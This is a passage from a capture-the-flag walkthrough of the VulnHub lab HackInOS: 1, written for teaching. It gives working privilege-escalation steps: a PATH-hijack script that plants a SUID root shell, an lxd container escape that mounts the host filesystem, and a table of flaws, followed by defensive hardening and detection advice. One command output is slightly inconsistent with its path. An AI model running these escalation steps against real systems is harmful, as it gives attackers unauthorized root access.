> -rw-------  1 root root  220 Mar  9  2019 flag
> ```

### 5.3 Read the flag

```sh
# cd /root
# ls -la
total 32
drwx------  4 root root 4096 Mar  9  2019 .
drwxr-xr-x 24 root root 4096 Mar  9  2019 ..
-rw-------  1 root root  220 Mar  9  2019 flag
-rw-r--r--  1 root root 3106 Apr  4  2018 .bashrc
drwxr-xr-x  3 root root 4096 Mar  9  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
# cat /root/flag
```

```text
Congratulations! You have successfully completed HackInOS: 1.

Thanks to Mehmet Oguz Tozkoparan, Omer Faruk Senyayla and Tufan Gungor.

-- Fatih Çelik
```

**Flag captured.** ✅

![Host root via the docker group, and /root/flag](images/06-root-flag.png)

### 5.4 Route B — PATH hijacking against a SUID binary

Some revisions of this image contain a small setuid helper (published walkthroughs
describe it as `a.out`) that calls `whoami` **by bare name**, relying on `$PATH`.

```bash
hummingbirdscyber@hackinos:~$ find / -xdev -perm -4000 -type f 2>/dev/null | grep -v '^/usr\|^/bin'
/home/hummingbirdscyber/a.out
hummingbirdscyber@hackinos:~$ ls -l /home/hummingbirdscyber/a.out
-rwsr-xr-x 1 root root 8432 Mar  9  2019 /home/hummingbirdscyber/a.out
hummingbirdscyber@hackinos:~$ strings -n 4 /home/hummingbirdscyber/a.out | grep -i 'who\|setuid\|system'
setuid
whoami
```

```bash
hummingbirdscyber@hackinos:~$ ./a.out
root
```

> **It prints `root`.** So the program calls `setuid(0)` and then runs `whoami` —
> as root. If we can make *our* `whoami` be the one it finds, we get arbitrary code
> execution as root.

```bash
hummingbirdscyber@hackinos:~$ echo $PATH
/home/hummingbirdscyber/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

> **`/home/hummingbirdscyber/bin` comes FIRST in `$PATH`** — and that directory is
> ours to write to. This is the classic **PATH hijack**:
>
> When a program calls `whoami` without a leading `/`, the C library searches each
> directory in `$PATH` in order and runs the **first match**. If an attacker controls
> a directory earlier in the search order, they control which binary runs. A SUID-root
> program that does this hands over root.

```bash
hummingbirdscyber@hackinos:~$ mkdir -p ~/bin
hummingbirdscyber@hackinos:~$ cat > ~/bin/whoami <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
chown root:root /tmp/rootbash
EOF
hummingbirdscyber@hackinos:~$ chmod 755 ~/bin/whoami
hummingbirdscyber@hackinos:~$ which whoami
/home/hummingbirdscyber/whoami
hummingbirdscyber@hackinos:~$ ./a.out
hummingbirdscyber@hackinos:~$ /tmp/rootbash -p
root@hackinos:/home/hummingbirdscyber# id
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) euid=0(root) groups=1000(hummingbirdscyber),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),999(docker)
root@hackinos:/home/hummingbirdscyber# cat /root/flag
```

> **`chmod 4755`** — the leading **`4`** is the SUID bit, producing
> `-rwsr-xr-x root root`. Any user executing it becomes root.
>
> **The `-p` flag is mandatory.** Bash *drops* its effective UID at startup unless
> invoked with `-p` ("privileged mode") — a deliberate guard against exactly this
> attack. Forgetting `-p` and getting `$` instead of `#` is the classic confusion.
>
> **`euid=0(root)` with `uid=1000`** — a SUID elevation. Permission checks use the
> *effective* UID, so this is full root for all practical purposes.
>
> **Two independent root paths on one box.** Always enumerate both SUID binaries and
> group memberships; never stop at the first win.

---

## 6. Alternative foothold worth knowing — `lxd` group

`hummingbirdscyber` is also in **`108(lxd)`**. LXD is Ubuntu's system-container
manager, and its group carries the same "effectively root" property as `docker`:

```bash
hummingbirdscyber@hackinos:~$ lxc init ubuntu:18.04 escape -c security.privileged=true
hummingbirdscyber@hackinos:~$ lxc config device add escape mydevice disk source=/ path=/mnt/root recursive=true
hummingbirdscyber@hackinos:~$ lxc start escape
hummingbirdscyber@hackinos:~$ lxc exec escape -- /bin/sh
# ls /mnt/root
bin  boot  dev  etc  home  initrd.img  lib  ...  root  ...
# cat /mnt/root/root/flag
```

> `security.privileged=true` disables the container's user namespace, so the
> container's root **is** the host's root; the disk device then mounts the host
> filesystem at `/mnt/root`. Same class of bug, different tool.
> Check <https://gtfobins.github.io/gtfobins/lxd/>.

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Web application on a non-standard port with no port 80 | 8000 | Easily missed by a default scan |
| 2 | Hard-coded `localhost` in the application's form action | `index.html` | Broken UX; forces `/etc/hosts` + manual request crafting |
| 3 | **Developer's vulnerable source published on GitHub and linked from the page** | HTML comment after upload | Full disclosure of the filter logic |
| 4 | **Extension allow-list declared but never enforced** | `upload.php` (`$allowed_ext` unused) | `.php` uploaded and stored |
| 5 | MIME check only inspects magic bytes | `finfo_file()` | GIF/PNG header defeats it |
| 6 | **Predictable "random" filename**: `md5($name . rand(1,100))` | `upload.php` | Only 100 candidates; enumerated in ~1 s |
| 7 | Uploads stored inside the document root | `/var/www/html/uploads/` | Executable by Apache |
| 8 | **SUID bit set on `tail`** | `/usr/bin/tail` (container) | Read `/etc/shadow` |
| 9 | **MD5-crypt password hashes with weak passwords** | `root:john`, `hummingbirdscyber:123456` | Cracked in seconds |
| 10 | **Credential reuse: container password = host SSH password** | port 22 | Container → host foothold |
| 11 | **Host user in the `docker` group** | `999(docker)` | **Host root** — trivially |
| 12 | Host user in the `lxd` group | `108(lxd)` | Alternative host root |
| 13 | **SUID binary calling `whoami` via `$PATH`, with a user-writable directory first in PATH** | `~/a.out` + `~/bin` | Alternative host root |
| 14 | No `gcc`/`nc` inside the container | slim image | *(Mitigating — blocks kernel exploits, so the intended path is the escape)* |

## 8. Defensive lessons (blue team)

1. **Never trust a file upload — re-encode it.** Checking MIME type is checking the
   first few bytes; checking the extension is checking a string. Neither is content
   validation. The only robust approach:
   ```php
   $img = imagecreatefromstring(file_get_contents($_FILES['file']['tmp_name']));
   if (!$img) { die('Not a valid image'); }
   $id   = bin2hex(random_bytes(16));          // CSPRNG, 128 bits of entropy
   $dest = '/var/uploads/' . $id . '.png';     // force the extension yourself
   imagepng($img, $dest);                      // re-encode: ALL metadata and trailing bytes destroyed
   imagedestroy($img);
   ```
   Store uploads **outside** the document root, serve them through a handler that
   never executes, and disable the engine in that directory:
   ```apache
   <Directory /var/uploads>
       php_flag engine off
       RemoveHandler .php .phtml .php3 .php4 .php5 .phar
       Options -ExecCGI -Indexes
   </Directory>
   ```
2. **Use an allow-list, and actually use it.** `$allowed_ext` was declared and then
   never referenced. A linter or a unit test ("uploading `x.php` must be rejected")
   would have caught this in CI. Enforce the extension *yourself*:
   ```php
   $ext = in_array(strtolower($ext), $allowed_ext, true) ? $ext : 'bin';
   ```
3. **Never use `rand()` for security.** `rand(1,100)` is 6.6 bits of entropy. Use
   `random_bytes()` / `bin2hex()` / UUIDv4. PHP's `mt_rand()` is also predictable
   (its state can be recovered from two outputs). Only `random_int()` and
   `random_bytes()` are CSPRNGs.
4. **Do not publish your vulnerable code with a link to it.** Beyond the obvious: in
   a real engagement, a leaked `.git` directory, a `SourceMap`, a `composer.json`, or
   a public repo named after the client is routinely how attackers get the source.
   Scan for it: `/.git/config`, `/.env`, `/composer.json`, `/package.json`,
   `/.well-known/`, `/wp-config.php.bak`.
5. **Never set SUID on a general-purpose tool.** `chmod u+s /usr/bin/tail` is
   equivalent to giving every local user read access to every file on the system.
   Audit continuously and diff against a baseline:
   ```bash
   find / -xdev -type f \( -perm -4000 -o -perm -2000 \) -printf '%M %u %p\n' 2>/dev/null | sort > suid.today
   diff suid.baseline suid.today
   ```
   `aide`, `osquery` (`SELECT * FROM suid_bin`) and Wazuh all do this automatically.
6. **Treat `docker` and `lxd` group membership as root.** Because it is.
   - Use **rootless Docker**: `dockerd-rootless-setuptool.sh install`. The daemon then
     runs as the user, so `-v /:/host` only exposes that user's own files.
   - Or **Podman**, which is daemonless and rootless by design with a
     Docker-compatible CLI.
   - If rootful Docker is unavoidable, front it with a **broker** exposing only an
     allow-list of subcommands via sudo — never hand out the raw socket.
   Detect exposure now:
   ```bash
   getent group docker lxd | tr ',' '\n'
   awk -F: '$4 ~ /docker|lxd/ {print $1}' /etc/group
   ls -l /var/run/docker.sock /var/snap/lxd/common/lxd/unix.socket
   ```
7. **Never let a SUID program resolve commands through `$PATH`.** Use absolute paths
   (`/usr/bin/whoami`), and clear the environment:
   ```c
   clearenv();
   execl("/usr/bin/whoami", "whoami", (char *)NULL);
   ```
   Belt and braces: sudoers' `secure_path` exists for the same reason, and
   `Defaults env_reset` wipes user-supplied variables.
8. **Hash passwords properly.** MD5-crypt (`$1$`) is obsolete. On Ubuntu 18.04+ use
   yescrypt (`$y$`) or at minimum SHA-512-crypt (`$6$`) with a high round count:
   ```text
   # /etc/login.defs
   ENCRYPT_METHOD YESCRYPT
   ```
   Then enforce a real policy — `pam_pwquality` with `minlen=14 dictcheck=1
   usercheck=1 enforce_for_root`, `pam_faillock` for lockout, and a breached-password
   screen. `john` and `123456` should be rejected at *set* time, not cracked later.
9. **Never reuse a password between a container and the host.** Containers are
   lower-trust than hosts by design; a leaked container credential must not be a
   host credential.
10. **Detection opportunities.**
    - Alert on file *creation* with a `.php` extension under an upload directory
      (auditd: `-w /var/www/html/uploads -p wa -k upload_write`), and on any file
      there whose bytes contain `<?php`.
    - Alert on `www-data` (or any service UID) reading `/etc/shadow` — auditd
      `-w /etc/shadow -p r -k shadow_read` with a `uid!=0` filter.
    - Alert on any `docker` CLI invocation whose arguments include `-v /`,
      `--privileged`, `--pid=host`, `--net=host` or `chroot`. Enable the Docker
      `audit`/`json-file` log driver and ship it.
    - Alert on `su` succeeding from a session whose parent is the web server.
    - Alert on new files appearing in a user-writable directory that precedes system
      paths in `$PATH` (the `~/bin/whoami` hijack).
    - Alert on outbound connections from a container to the host's SSH port — that
      pattern is a container escape in progress.

---

## 9. References

- VulnHub entry: <https://vulnhub.com/entry/hackinos-1,295/>
- Series: <https://vulnhub.com/series/hackinos,201/>
- Author: Fatih Çelik · the intentionally vulnerable source:
  <https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php>
- Community writeups consulted:
  - [Hacking Articles — HackInOS:1: Vulnhub Lab Walkthrough](https://www.hackingarticles.in/hackinos1-vulnhub-lab-walkthrough/)
  - [Jon Wood / windsorwebdeveloper — HackInOS: 1 Vulnhub Walkthrough (PATH hijack)](https://windsorwebdeveloper.com/hackinos-1-vulnhub-walkthrough/)
  - [Jack Barradell-Johns — HackInOs One Writeup](https://blog.barradell-johns.com/index.php/2019-04-03/hackinos-one-writeup/)
  - [ethicalhackers.club — HackInOS Level 1 (VulnHub) Complete Walkthrough](https://ethicalhackers.club/hackinos-level-1-vulnhub-complete-walkthrough-guide/)
  - [Vuln Mafia — HackInOS: 1](https://pentestmafia.github.io/Vulnhub/writeup/hackinos1.html)
  - [leegengyu — vulnhub-box-walkthrough / hackinos-1.md](https://github.com/leegengyu/vulnhub-box-walkthrough)
- Background reading:
  - [GTFOBins — tail (SUID file read)](https://gtfobins.github.io/gtfobins/tail/#suid)
  - [GTFOBins — docker](https://gtfobins.github.io/gtfobins/docker/) · [lxd](https://gtfobins.github.io/gtfobins/lxd/)
  - [Docker rootless mode](https://docs.docker.com/engine/security/rootless/) · [Docker daemon attack surface](https://docs.docker.com/engine/security/#docker-daemon-attack-surface)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [PHP `pathinfo`](https://www.php.net/manual/en/function.pathinfo.php) · [`finfo`](https://www.php.net/manual/en/class.finfo.php) · [`random_bytes`](https://www.php.net/manual/en/function.random-bytes.php) · [`rand` (why not to use it)](https://www.php.net/manual/en/function.rand.php)
  - [`ffuf`](https://github.com/ffuf/ffuf) · [`wfuzz`](https://github.com/xmendez/wfuzz) · [`gobuster`](https://github.com/OJ/gobuster)
  - [John the Ripper — crypt formats](https://www.openwall.com/john/doc/README.md)
  - [HackTricks — Bypassing image upload restrictions](https://book.hacktricks.xyz/pentesting-web/file-upload)
  - [HackTricks — Container escape / Docker breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
  - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## 10. Screenshot checklist

- [ ] `images/01-nmap.png` — SSH on 22 and HTTP on 8000
- [ ] `images/02-source.png` — the `upload.php` source from GitHub
- [ ] `images/03-container.png` — `/.dockerenv` and the container-ID hostname
- [ ] `images/04-shell.png` — reverse shell as `www-data` inside the container
- [ ] `images/05-container-root.png` — SUID `tail` → `/etc/shadow` → `su root` → fake flag
- [ ] `images/06-root-flag.png` — `docker run -v /:/host … chroot` → host root → `/root/flag`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
